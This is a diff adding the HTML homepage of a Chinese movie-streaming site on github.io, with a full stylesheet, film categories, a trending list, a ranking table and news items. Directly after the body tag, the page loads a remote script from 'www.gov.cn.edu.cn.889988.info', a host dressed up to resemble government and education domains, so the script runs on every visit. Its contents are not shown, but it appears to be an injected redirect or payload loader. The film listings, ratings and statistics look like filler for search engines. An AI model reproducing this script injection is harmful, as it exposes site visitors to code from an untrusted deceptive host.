@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>奇奇网电影网 - 海量高清电影电视剧在线观看平台</title>
+<meta name="description" content="奇奇网电影网(qiqiwangdianyingwang-wap.github.io)提供海量高清电影、热播电视剧、综艺、动漫在线观看，最新院线大片与经典老片一网打尽，每日更新。">
+<meta name="keywords" content="奇奇网电影网, 奇奇网, 电影网, 高清电影, 电视剧, 在线观看, 热播影视, 动漫综艺">
+<meta name="author" content="奇奇网电影网">
+<meta name="robots" content="index, follow">
+<meta name="renderer" content="webkit">
+<meta name="format-detection" content="telephone=no">
+<link rel="canonical" href="https://qiqiwangdianyingwang-wap.github.io/">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "WebSite",
+  "name": "奇奇网电影网",
+  "url": "https://qiqiwangdianyingwang-wap.github.io/",
+  "description": "奇奇网电影网提供海量高清电影、电视剧、综艺、动漫在线观看，最新院线与经典老片每日更新。",
+  "potentialAction": {
+    "@type": "SearchAction",
+    "target": "https://qiqiwangdianyingwang-wap.github.io/#search?q={query}",
+    "query-input": "required name=query"
+  }
+}
+</script>
+<style>
+/* ============ 基础重置 & 黑金主题 ============ */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#0d0f14;
+  --bg2:#151823;
+  --card:#1b1f2c;
+  --line:#2a2f3f;
+  --gold:#e8b44a;
+  --gold2:#f4cf79;
+  --ink:#f2f4f8;
+  --sub:#a7afc2;
+  --red:#ff3b5c;
+  --radius:16px;
+  --shadow:0 18px 44px rgba(0,0,0,.45);
+  --max:1200px;
+}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{font-family:"PingFang SC","Hiragino Sans GB","Microsoft YaHei",-apple-system,BlinkMacSystemFont,sans-serif;background:var(--bg);color:var(--ink);line-height:1.7;overflow-x:hidden}
+img{max-width:100%;display:block}
+a{color:inherit;text-decoration:none;transition:.2s}
+ul{list-style:none}
+button{font:inherit;cursor:pointer;border:none;background:none;color:inherit}
+.wrap{max-width:var(--max);margin:0 auto;padding:0 16px}
+section{scroll-margin-top:80px}
+
+/* ============ 跑马灯公告 ============ */
+.marq{background:linear-gradient(90deg,var(--gold),#c9962c);padding:9px 0;overflow:hidden;font-size:13px;font-weight:700;color:#2a1d00}
+.marq span{padding-left:100%;display:inline-block;white-space:nowrap;animation:scroll 26s linear infinite}
+@keyframes scroll{from{transform:translateX(0)}to{transform:translateX(-100%)}}
+.marq b{color:#b3243a}
+
+/* ============ 头部 ============ */
+.head{position:sticky;top:0;z-index:100;background:rgba(13,15,20,.92);backdrop-filter:blur(12px);border-bottom:1px solid var(--line)}
+.head .wrap{display:flex;align-items:center;gap:20px;height:70px}
+.logo{display:flex;align-items:center;gap:10px;flex-shrink:0}
+.logo i{width:40px;height:40px;border-radius:12px;background:linear-gradient(135deg,var(--gold),#b8862a);display:grid;place-items:center;font-size:20px;font-style:normal;font-weight:900;color:#2a1d00}
+.logo b{font-size:22px;font-weight:900;letter-spacing:1px}
+.logo b em{font-style:normal;color:var(--gold)}
+.nav{display:flex;gap:4px;margin-left:auto}
+.nav a{padding:8px 15px;border-radius:10px;font-size:14px;font-weight:600;color:var(--sub)}
+.nav a:hover{color:var(--gold);background:rgba(232,180,74,.08)}
+.rbtn{display:flex;gap:8px;flex-shrink:0}
+.rbtn a{padding:9px 20px;border-radius:999px;font-size:14px;font-weight:700}
+.rbtn .in{border:1.5px solid var(--gold);color:var(--gold)}
+.rbtn .up{background:var(--gold);color:#2a1d00}
+.mbtn{display:none;font-size:26px;color:var(--gold)}
+.mnav{display:none;background:var(--bg2);border-bottom:1px solid var(--line)}
+.mnav a{display:block;padding:14px 16px;border-bottom:1px solid var(--line);font-weight:600;color:var(--ink)}
+
+/* ============ Hero ============ */
+.hero{padding:70px 0;position:relative}
+.hero::before{content:"";position:absolute;inset:0;background:radial-gradient(900px 400px at 80% 20%,rgba(232,180,74,.10),transparent);pointer-events:none}
+.hero .wrap{position:relative;display:grid;grid-template-columns:1fr 1fr;gap:48px;align-items:center}
+.hero h1{font-size:clamp(32px,5.4vw,54px);font-weight:900;line-height:1.2}
+.hero h1 em{font-style:normal;color:var(--gold)}
+.kpis{display:flex;gap:28px;margin:24px 0}
+.kpi b{font-size:26px;font-weight:900;color:var(--gold);display:block}
+.kpi span{font-size:13px;color:var(--sub)}
+.hacts{display:flex;gap:12px;flex-wrap:wrap;margin-top:8px}
+.btn{display:inline-flex;align-items:center;gap:8px;padding:14px 30px;border-radius:12px;font-weight:800;font-size:15px}
+.bg{background:var(--gold);color:#2a1d00}
+.bg:hover{background:var(--gold2);transform:translateY(-2px)}
+.bgo{border:1.5px solid var(--line);color:var(--ink)}
+.bgo:hover{border-color:var(--gold);color:var(--gold)}
+/* Hero 右侧：环形排布影片 */
+.orbit{position:relative;height:420px;display:grid;place-items:center}
+.orbit .core{width:150px;height:150px;border-radius:50%;background:linear-gradient(135deg,var(--gold),#b8862a);display:grid;place-items:center;text-align:center;z-index:2;box-shadow:0 0 0 10px rgba(232,180,74,.12),0 0 60px rgba(232,180,74,.3)}
+.orbit .core b{font-size:19px;color:#2a1d00;line-height:1.3}
+.ob{position:absolute;width:150px;background:var(--card);border:1px solid var(--line);border-radius:14px;padding:10px;display:flex;gap:10px;align-items:center;box-shadow:var(--shadow);transition:.25s}
+.ob:hover{transform:scale(1.06);border-color:var(--gold)}
+.ob .t{width:42px;height:42px;border-radius:10px;display:grid;place-items:center;font-size:20px;flex-shrink:0}
+.ob h4{font-size:13px;font-weight:800}
+.ob p{font-size:11px;color:var(--sub)}
+.o1{top:8px;left:6%}.o2{top:6px;right:4%}.o3{top:44%;left:-2%}.o4{top:46%;right:-2%}.o5{bottom:6px;left:16%}.o6{bottom:4px;right:14%}
+
+/* ============ 区块标题 ============ */
+.block{padding:64px 0}
+.bh{display:flex;align-items:center;justify-content:space-between;gap:16px;margin-bottom:30px;flex-wrap:wrap}
+.bh h2{font-size:24px;font-weight:900;display:flex;align-items:center;gap:12px}
+.bh h2::before{content:"";width:5px;height:26px;border-radius:3px;background:var(--gold)}
+.bh .more{font-size:14px;color:var(--sub);font-weight:600}
+.bh .more:hover{color:var(--gold)}
+
+/* ============ 栏目一：分类（玻璃大宫格，差异化） ============ */
+.glass{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.gc{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);padding:26px 22px;transition:.25s;position:relative;overflow:hidden}
+.gc::before{content:"";position:absolute;top:0;left:0;width:100%;height:5px;background:var(--line)}
+.gc:hover{transform:translateY(-6px);border-color:var(--gold)}
+.gc:hover::before{background:var(--gold)}
+.gc .ic{font-size:34px;display:block;margin-bottom:14px}
+.gc b{font-size:18px;font-weight:800;display:block}
+.gc span{font-size:13px;color:var(--sub)}
+
+/* ============ 栏目二：今日热播（差异化：横向滚动条 + 大封面） ============ */
+.hsc{display:flex;gap:16px;overflow-x:auto;padding-bottom:12px;scroll-snap-type:x mandatory;-webkit-overflow-scrolling:touch}
+.hsc::-webkit-scrollbar{height:8px}
+.hsc::-webkit-scrollbar-thumb{background:var(--line);border-radius:4px}
+.hc{flex:0 0 250px;scroll-snap-align:start;background:var(--card);border-radius:var(--radius);overflow:hidden;border:1px solid var(--line);transition:.25s}
+.hc:hover{transform:translateY(-6px);border-color:var(--gold)}
+.hc .cv{height:300px;position:relative;display:grid;place-items:center;color:#fff;text-align:center;padding:18px}
+.hc .cv b{font-size:20px;position:relative;z-index:1}
+.hc .rk{position:absolute;top:12px;left:12px;background:var(--red);color:#fff;font-size:12px;font-weight:800;padding:4px 10px;border-radius:6px;z-index:1}
+.hc .rt{position:absolute;bottom:12px;right:12px;background:rgba(0,0,0,.55);color:var(--gold2);font-size:13px;font-weight:800;padding:4px 10px;border-radius:6px;z-index:1}
+.hc .info{padding:14px 16px}
+.hc .info h3{font-size:16px;font-weight:800}
+.hc .info p{font-size:12px;color:var(--sub);margin-top:4px}
+
+/* ============ 栏目三：精选推荐（差异化：杂志错落 + 大字编号） ============ */
+.mage{display:grid;grid-template-columns:repeat(6,1fr);grid-auto-rows:120px;gap:14px}
+.mg{background:var(--card);border-radius:var(--radius);overflow:hidden;border:1px solid var(--line);transition:.25s;position:relative;display:flex;flex-direction:column;justify-content:flex-end;padding:16px;color:#fff}
+.mg::before{content:attr(data-n);position:absolute;top:6px;right:10px;font-size:42px;font-weight:900;color:rgba(255,255,255,.2);line-height:1;z-index:1}
+.mg:hover{transform:translateY(-5px)}
+.mg b{font-size:16px;position:relative;z-index:2}
+.mg span{font-size:12px;opacity:.9;position:relative;z-index:2}
+.m1{grid-column:span 3;grid-row:span 2}
+.m2{grid-column:span 3;grid-row:span 1}
+.m3{grid-column:span 3;grid-row:span 1}
+.m4{grid-column:span 2;grid-row:span 2}
+.m5{grid-column:span 2;grid-row:span 1}
+.m6{grid-column:span 2;grid-row:span 1}
+
+/* ============ 栏目四：榜单（差异化：深色表格 + 金银铜徽章） ============ */
+.tblbox{background:var(--card);border:1px solid var(--line);border-radius:20px;overflow:hidden}
+table{width:100%;border-collapse:collapse}
+th{background:var(--bg2);text-align:left;padding:16px 18px;font-size:13px;color:var(--sub);font-weight:700;text-transform:uppercase;letter-spacing:1px}
+td{padding:16px 18px;border-top:1px solid var(--line);font-weight:600;vertical-align:middle}
+tr:hover td{background:rgba(232,180,74,.05)}
+td.rk{width:70px}
+.med{width:34px;height:34px;border-radius:50%;display:grid;place-items:center;font-weight:900;font-size:15px;color:#fff}
+.g1{background:linear-gradient(135deg,#f6c453,#b8862a)}
+.g2{background:linear-gradient(135deg,#d9dee6,#8d96a6)}
+.g3{background:linear-gradient(135deg,#e09b6b,#a6653a)}
+.gn{background:var(--bg2);color:var(--sub)}
+.tit{font-size:15px;font-weight:800}
+.tit small{display:block;font-size:12px;color:var(--sub);font-weight:500}
+.gen{font-size:12px;padding:4px 12px;border-radius:999px;background:var(--bg2);color:var(--sub);white-space:nowrap}
+.up{color:var(--gold);font-weight:800;font-size:13px}
+
+/* ============ 栏目五：资讯（差异化：左图右文列表 + 时间轴点） ============ */
+.tml{display:grid;grid-template-columns:1fr 1fr;gap:32px}
+.tline{position:relative;padding-left:26px}
+.tline::before{content:"";position:absolute;left:7px;top:8px;bottom:8px;width:2px;background:var(--line)}
+.ti{position:relative;padding-bottom:24px}
+.ti::before{content:"";position:absolute;left:-26px;top:8px;width:16px;height:16px;border-radius:50%;background:var(--bg);border:3px solid var(--gold)}
+.ti time{font-size:12px;color:var(--gold);font-weight:700}
+.ti h4{font-size:16px;font-weight:800;margin:6px 0 6px}
+.ti p{font-size:14px;color:var(--sub)}
+.feed{display:flex;flex-direction:column;gap:14px}
+.fi{display:flex;gap:16px;background:var(--card);border:1px solid var(--line);border-radius:var(--radius);padding:14px;transition:.25s}
+.fi:hover{transform:translateX(6px);border-color:var(--gold)}
+.fi .th{width:120px;height:80px;border-radius:12px;flex-shrink:0;display:grid;place-items:center;color:#fff;text-align:center;font-size:13px;font-weight:800;padding:8px}
+.fi h4{font-size:15px;font-weight:800}
+.fi time{font-size:12px;color:var(--sub);font-weight:600}
+
+/* ============ 栏目六：关于（差异化：双卡片 + 大字排版） ============ */
+.abt{display:grid;grid-template-columns:1.2fr 1fr;gap:20px}
+.ac{background:var(--card);border:1px solid var(--line);border-radius:24px;padding:38px}
+.ac h2{font-size:26px;font-weight:900;margin-bottom:16px}
+.ac h2 em{font-style:normal;color:var(--gold)}
+.ac p{color:var(--sub);margin-bottom:12px}
+.grid4{display:grid;grid-template-columns:repeat(2,1fr);gap:14px;margin-top:24px}
+.g4{border:1px solid var(--line);border-radius:14px;padding:18px}
+.g4 b{font-size:22px;font-weight:900;color:var(--gold);display:block}
+.g4 span{font-size:13px;color:var(--sub)}
+.as{background:linear-gradient(160deg,#1e2333,#151823);border:1px solid var(--line);border-radius:24px;padding:38px;display:flex;flex-direction:column;gap:18px}
+.as h3{font-size:18px;font-weight:800;color:var(--gold)}
+.asi{display:flex;gap:12px;align-items:flex-start}
+.asi .d{width:44px;height:44px;border-radius:12px;background:rgba(232,180,74,.12);display:grid;place-items:center;font-size:20px;flex-shrink:0}
+.asi div span{font-size:13px;color:var(--sub)}
+
+/* ============ 页脚 ============ */
+.foot{background:#080a0e;border-top:1px solid var(--line);padding:44px 0 24px}
+.foot .wrap{display:grid;grid-template-columns:1.4fr 1fr;gap:30px}
+.foot .logo{margin-bottom:14px}
+.foot .fl a{display:inline-block;margin:0 18px 10px 0;color:var(--sub);font-size:14px}
+.foot .fl a:hover{color:var(--gold)}
+.foot p{font-size:13px;color:var(--sub);line-height:1.9}
+
+/* ============ 回顶 ============ */
+.gt{position:fixed;right:18px;bottom:24px;z-index:90;width:46px;height:46px;border-radius:14px;background:var(--gold);color:#2a1d00;font-size:18px;font-weight:900;box-shadow:0 8px 20px rgba(232,180,74,.4);display:none;place-items:center}
+.gt.on{display:grid}
+
+/* ============ 响应式 ============ */
+@media (max-width:980px){
+  .glass{grid-template-columns:repeat(2,1fr)}
+  .mage{grid-template-columns:repeat(4,1fr);grid-auto-rows:110px}
+  .m1,.m2,.m3{grid-column:span 2}
+  .m4,.m5,.m6{grid-column:span 2}
+}
+@media (max-width:860px){
+  .nav,.rbtn{display:none}
+  .mbtn{display:block;margin-left:auto}
+  .hero{padding:44px 0 54px}
+  .hero .wrap{grid-template-columns:1fr}
+  .orbit{height:auto;display:none}
+  .block{padding:46px 0}
+  .kpis{justify-content:space-between;gap:12px}
+  .tml{grid-template-columns:1fr}
+  .abt{grid-template-columns:1fr}
+  .ac,.as{padding:26px}
+  .foot .wrap{grid-template-columns:1fr}
+  th,td{padding:12px 10px;font-size:13px}
+}
+@media (max-width:480px){
+  .glass{grid-template-columns:1fr 1fr}
+  .mage{grid-template-columns:repeat(2,1fr);grid-auto-rows:120px}
+  .m1,.m2,.m3,.m4,.m5,.m6{grid-column:span 2;grid-row:span 1}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<!-- 公告跑马灯 -->
+<div class="marq"><span>🔥 <b>奇奇网电影网</b> 每日持续更新！最新院线大片、热播剧集、高分综艺、动漫新番一网打尽，尽在 qiqiwangdianyingwang-wap.github.io　|　支持手机 / 电脑 / 平板多端自适应观看　|　精选好片，尽在奇奇网电影网</span></div>
+
+<!-- 头部 -->
+<header class="head">
+  <div class="wrap">
+    <a href="#top" class="logo"><i>奇</i><b>奇奇网<em>电影网</em></b></a>
+    <nav class="nav">
+      <a href="#cat">影片分类</a>
+      <a href="#hot">今日热播</a>
+      <a href="#pick">精选推荐</a>
+      <a href="#rank">热播榜单</a>
+      <a href="#news">影视资讯</a>
+      <a href="#about">关于我们</a>
+    </nav>
+    <div class="rbtn"><a href="#" class="in">登录</a><a href="#" class="up">立即注册</a></div>
+    <button class="mbtn" id="mBtn" aria-label="菜单">☰</button>
+  </div>
+  <div class="mnav" id="mNav">
+    <a href="#top">🏠 首页</a>
+    <a href="#cat">🎭 影片分类</a>
+    <a href="#hot">🔥 今日热播</a>
+    <a href="#pick">⭐ 精选推荐</a>
+    <a href="#rank">🏆 热播榜单</a>
+    <a href="#news">📰 影视资讯</a>
+    <a href="#about">ℹ️ 关于我们</a>
+  </div>
+</header>
+
+<!-- Hero -->
+<section class="hero" id="top">
+  <div class="wrap">
+    <div>
+      <h1>看电影上 <em>奇奇网</em><br>好片一网打尽</h1>
+      <div class="kpis">
+        <div class="kpi"><b>12万+</b><span>影视资源</span></div>
+        <div class="kpi"><b>1080P</b><span>高清画质</span></div>
+        <div class="kpi"><b>24h</b><span>每日更新</span></div>
+      </div>
+      <p style="color:var(--sub);max-width:460px">奇奇网电影网（qiqiwangdianyingwang-wap.github.io）汇聚最新电影、热播电视剧、综艺节目与动漫番剧，海量高清片库每日持续更新，让你轻松找到想看的每一部好片。</p>
+      <div class="hacts">
+        <a href="#hot" class="btn bg">立即观看 →</a>
+        <a href="#cat" class="btn bgo">浏览分类</a>
+      </div>
+    </div>
+    <div class="orbit">
+      <div class="core"><b>奇奇网<br>电影网</b></div>
+      <a href="#" class="ob o1"><span class="t" style="background:linear-gradient(135deg,#e8b44a,#b8862a)">🎬</span><div><h4>暗夜追凶</h4><p>悬疑犯罪</p></div></a>
+      <a href="#" class="ob o2"><span class="t" style="background:linear-gradient(135deg,#ff3b5c,#ff7189)">📺</span><div><h4>山海奇缘</h4><p>古装奇幻</p></div></a>
+      <a href="#" class="ob o3"><span class="t" style="background:linear-gradient(135deg,#00a86b,#3fd6a0)">🎤</span><div><h4>声入人心</h4><p>综艺音乐</p></div></a>
+      <a href="#" class="ob o4"><span class="t" style="background:linear-gradient(135deg,#7c3aed,#a78bfa)">🎨</span><div><h4>星海少年</h4><p>热血动漫</p></div></a>
+      <a href="#" class="ob o5"><span class="t" style="background:linear-gradient(135deg,#0891b2,#22d3ee)">💕</span><div><h4>春日来信</h4><p>治愈爱情</p></div></a>
+      <a href="#" class="ob o6"><span class="t" style="background:linear-gradient(135deg,#e11d48,#fb7185)">🎭</span><div><h4>律政风云</h4><p>律政职场</p></div></a>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目一：影片分类 -->
+<section class="block" id="cat">
+  <div class="wrap">
+    <div class="bh"><h2>影片分类</h2><a href="#" class="more">全部频道 ›</a></div>
+    <div class="glass">
+      <a href="#" class="gc"><span class="ic">🎬</span><b>电影大片</b><span>院线热映 / 经典老片</span></a>
+      <a href="#" class="gc"><span class="ic">📺</span><b>电视剧集</b><span>热播好剧持续更新</span></a>
+      <a href="#" class="gc"><span class="ic">🎤</span><b>综艺节目</b><span>欢乐内容每日上新</span></a>
+      <a href="#" class="gc"><span class="ic">🎨</span><b>动漫番剧</b><span>新番热番全收录</span></a>
+      <a href="#" class="gc"><span class="ic">💕</span><b>爱情治愈</b><span>甜蜜心动不间断</span></a>
+      <a href="#" class="gc"><span class="ic">🔍</span><b>悬疑犯罪</b><span>高能反转烧脑不断</span></a>
+      <a href="#" class="gc"><span class="ic">⚔️</span><b>古装奇幻</b><span>视觉大片震撼上线</span></a>
+      <a href="#" class="gc"><span class="ic">😂</span><b>喜剧搞笑</b><span>轻松一刻快乐加倍</span></a>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目二：今日热播 -->
+<section class="block" id="hot" style="padding-top:0;">
+  <div class="wrap">
+    <div class="bh"><h2>今日热播</h2><a href="#" class="more">更多热播 ›</a></div>
+    <div class="hsc">
+      <a href="#" class="hc"><div class="cv" style="background:linear-gradient(135deg,#2b1d3a,#5b3a78)"><span class="rk">HOT</span><span class="rt">★ 9.3</span><b>《暗夜追凶》</b></div><div class="info"><h3>暗夜追凶</h3><p>悬疑犯罪 · 高能反转</p></div></a>
+      <a href="#" class="hc"><div class="cv" style="background:linear-gradient(135deg,#3a1d1d,#a83838)"><span class="rk">NEW</span><span class="rt">★ 8.8</span><b>《山海奇缘》</b></div><div class="info"><h3>山海奇缘</h3><p>古装奇幻 · 视觉大片</p></div></a>
+      <a href="#" class="hc"><div class="cv" style="background:linear-gradient(135deg,#1d3a2b,#2f8f5e)"><span class="rk">HOT</span><span class="rt">★ 9.0</span><b>《声入人心》</b></div><div class="info"><h3>声入人心</h3><p>音乐竞演 · 实力开唱</p></div></a>
+      <a href="#" class="hc"><div class="cv" style="background:linear-gradient(135deg,#1d2a3a,#3a6ea8)"><span class="rk">NEW</span><span class="rt">★ 9.1</span><b>《星海少年》</b></div><div class="info"><h3>星海少年</h3><p>热血动漫 · 持续追更</p></div></a>
+      <a href="#" class="hc"><div class="cv" style="background:linear-gradient(135deg,#3a351d,#c9a227)"><span class="rk">HOT</span><span class="rt">★ 8.5</span><b>《春日来信》</b></div><div class="info"><h3>春日来信</h3><p>治愈爱情 · 暖心上线</p></div></a>
+      <a href="#" class="hc"><div class="cv" style="background:linear-gradient(135deg,#1d3a38,#1f8f87)"><span class="rk">NEW</span><span class="rt">★ 8.7</span><b>《律政风云》</b></div><div class="info"><h3>律政风云</h3><p>律政职场 · 高能对决</p></div></a>
+      <a href="#" class="hc"><div class="cv" style="background:linear-gradient(135deg,#2a1d3a,#8b3aa8)"><span class="rk">HOT</span><span class="rt">★ 8.9</span><b>《幻夜之城》</b></div><div class="info"><h3>幻夜之城</h3><p>科幻冒险 · 视觉奇观</p></div></a>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目三：精选推荐 -->
+<section class="block" id="pick">
+  <div class="wrap">
+    <div class="bh"><h2>精选推荐</h2><a href="#" class="more">更多片单 ›</a></div>
+    <div class="mage">
+      <a href="#" class="mg m1" style="background:linear-gradient(135deg,#3a1d3a,#7d3a8c)" data-n="01"><b>暗夜追凶</b><span>悬疑犯罪 · 年度黑马，口碑一路走高</span></a>
+      <a href="#" class="mg m2" style="background:linear-gradient(135deg,#1d3a2b,#2f8f5e)" data-n="02"><b>山海奇缘</b><span>古装奇幻</span></a>
+      <a href="#" class="mg m3" style="background:linear-gradient(135deg,#3a1d1d,#c95a3a)" data-n="03"><b>声入人心</b><span>综艺音乐</span></a>
+      <a href="#" class="mg m4" style="background:linear-gradient(135deg,#1d2a3a,#3a6ea8)" data-n="04"><b>星海少年</b><span>热血动漫 · 持续追更</span></a>
+      <a href="#" class="mg m5" style="background:linear-gradient(135deg,#3a351d,#c9a227)" data-n="05"><b>春日来信</b><span>治愈爱情</span></a>
+      <a href="#" class="mg m6" style="background:linear-gradient(135deg,#1d3a38,#1f8f87)" data-n="06"><b>律政风云</b><span>律政职场</span></a>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目四：热播榜单 -->
+<section class="block" id="rank" style="padding-top:0;">
+  <div class="wrap">
+    <div class="bh"><h2>热播榜单 TOP6</h2><a href="#" class="more">完整榜单 ›</a></div>
+    <div class="tblbox">
+      <table>
+        <thead><tr><th>排名</th><th>片名</th><th>类型</th><th>更新</th><th>热度</th></tr></thead>
+        <tbody>
+          <tr><td class="rk"><span class="med g1">1</span></td><td><span class="tit">暗夜追凶<small>悬疑 / 犯罪</small></span></td><td><span class="gen">悬疑</span></td><td>24/30集</td><td class="up">986万 ↑</td></tr>
+          <tr><td class="rk"><span class="med g2">2</span></td><td><span class="tit">山海奇缘<small>古装 / 奇幻</small></span></td><td><span class="gen">古装</span></td><td>12集</td><td class="up">912万 ↑</td></tr>
+          <tr><td class="rk"><span class="med g3">3</span></td><td><span class="tit">声入人心<small>综艺 / 音乐</small></span></td><td><span class="gen">综艺</span></td><td>EP10</td><td class="up">845万 ↑</td></tr>
+          <tr><td class="rk"><span class="med gn">4</span></td><td><span class="tit">春日来信<small>爱情 / 治愈</small></span></td><td><span class="gen">爱情</span></td><td>正片</td><td class="up">732万 ↑</td></tr>
+          <tr><td class="rk"><span class="med gn">5</span></td><td><span class="tit">星海少年<small>动漫 / 热血</small></span></td><td><span class="gen">动漫</span></td><td>18集</td><td class="up">681万 ↑</td></tr>
+          <tr><td class="rk"><span class="med gn">6</span></td><td><span class="tit">律政风云<small>律政 / 职场</small></span></td><td><span class="gen">职场</span></td><td>08集</td><td class="up">605万 ↑</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目五：影视资讯 -->
+<section class="block" id="news">
+  <div class="wrap">
+    <div class="bh"><h2>影视资讯</h2><a href="#" class="more">更多资讯 ›</a></div>
+    <div class="tml">
+      <div class="tline">
+        <div class="ti"><time datetime="2026-10-08">2026 · 10 · 08</time><h4>《暗夜追凶》热度破纪录，登顶悬疑榜首</h4><p>凭借高能反转剧情与电影级视听语言，该剧口碑与播放量持续走高，被观众誉为年度必看悬疑佳作。</p></div>
+        <div class="ti"><time datetime="2026-10-02">2026 · 10 · 02</time><h4>多部经典老片启动 4K 修复，年底重登银幕</h4><p>修复版画面与音效全面升级，经典作品将以全新面貌与观众见面。</p></div>
+        <div class="ti"><time datetime="2026-09-28">2026 · 09 · 28</time><h4>秋冬档片单正式发布，数十部新片定档</h4><p>涵盖动作、爱情、动画等多种类型，观众选择更加丰富。</p></div>
+      </div>
+      <div class="feed">
+        <a href="#" class="fi"><div class="th" style="background:linear-gradient(135deg,#3a1d3a,#7d3a8c)">院线</div><div><time>2026 · 10 · 05</time><h4>国产动画票房创新高，原创IP持续发力</h4></div></a>
+        <a href="#" class="fi"><div class="th" style="background:linear-gradient(135deg,#1d3a2b,#2f8f5e)">综艺</div><div><time>2026 · 10 · 01</time><h4>多档新综艺开播，题材更加多元</h4></div></a>
+        <a href="#" class="fi"><div class="th" style="background:linear-gradient(135deg,#3a1d1d,#c95a3a)">剧集</div><div><time>2026 · 09 · 25</time><h4>都市职场剧成新风口，聚焦现实议题</h4></div></a>
+        <a href="#" class="fi"><div class="th" style="background:linear-gradient(135deg,#1d2a3a,#3a6ea8)">技术</div><div><time>2026 · 09 · 20</time><h4>HDR 与高帧率普及，家庭观影再升级</h4></div></a>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目六：关于我们 -->
+<section class="block" id="about" style="padding-top:0;">
+  <div class="wrap">
+    <div class="bh"><h2>关于我们</h2></div>
+    <div class="abt">
+      <div class="ac">
+        <h2>关于 <em>奇奇网电影网</em></h2>
+        <p>奇奇网电影网（qiqiwangdianyingwang-wap.github.io）专注影视内容推荐，覆盖电影、电视剧、综艺、动漫等多种类型，打造海量精选片库。</p>
+        <p>每日持续更新，分类清晰、片单丰富，让你轻松发现值得一看的好内容，随时随地享受高清观影体验。</p>
+        <div class="grid4">
+          <div class="g4"><b>12万+</b><span>影视资源</span></div>
+          <div class="g4"><b>1080P</b><span>高清画质</span></div>
+          <div class="g4"><b>6大</b><span>内容分类</span></div>
+          <div class="g4"><b>24h</b><span>每日更新</span></div>
+        </div>
+      </div>
+      <div class="as">
+        <h3>联系 & 信息</h3>
+        <div class="asi"><span class="d">🌐</span><div><b>网址</b><span>qiqiwangdianyingwang-wap.github.io</span></div></div>
+        <div class="asi"><span class="d">📛</span><div><b>名称</b><span>奇奇网电影网</span></div></div>
+        <div class="asi"><span class="d">🎯</span><div><b>定位</b><span>海量高清影视在线观看平台</span></div></div>
+        <div class="asi"><span class="d">🕐</span><div><b>更新</b><span>每日持续更新</span></div></div>
+        <div class="asi"><span class="d">📱</span><div><b>适配</b><span>PC / 手机 / 平板多端自适应</span></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 页脚 -->
+<footer class="foot">
+  <div class="wrap">
+    <div class="fl">
+      <a href="#top" class="logo"><i>奇</i><b style="color:#fff">奇奇网<em style="color:var(--gold)">电影网</em></b></a>
+      <div><a href="#cat">影片分类</a><a href="#hot">今日热播</a><a href="#pick">精选推荐</a><a href="#rank">热播榜单</a><a href="#news">影视资讯</a><a href="#about">关于我们</a></div>
+    </div>
+    <div><p>© 2026 奇奇网电影网（qiqiwangdianyingwang-wap.github.io）版权所有</p><p>本站仅供影视信息展示与推荐，请支持正版，尊重影视版权。</p></div>
+  </div>
+</footer>
+
+<button class="gt" id="gTop" aria-label="回到顶部">↑</button>
+
+<script>
+var mBtn=document.getElementById('mBtn'),mNav=document.getElementById('mNav');
+mBtn.addEventListener('click',function(){mNav.style.display=mNav.style.display==='block'?'none':'block';});
+mNav.querySelectorAll('a').forEach(function(a){a.addEventListener('click',function(){mNav.style.display='none';});});
+var gTop=document.getElementById('gTop');
+window.addEventListener('scroll',function(){gTop.classList.toggle('on',window.scrollY>400);});
+gTop.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'});});
+</script>
+</body>
+</html>
